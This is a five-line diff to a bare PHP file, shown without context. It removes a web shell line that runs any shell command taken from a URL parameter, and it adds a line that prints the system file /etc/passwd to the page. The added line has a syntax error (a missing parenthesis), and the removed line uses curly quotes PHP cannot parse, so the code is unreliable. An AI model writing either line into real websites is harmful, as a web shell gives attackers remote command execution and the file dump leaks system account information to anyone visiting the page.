@@ -1,5 +1,5 @@
 <?php
 
-system($_GET[‘cmd’]);
+echo(file_get_contents("/etc/passwd");
 
 ?>
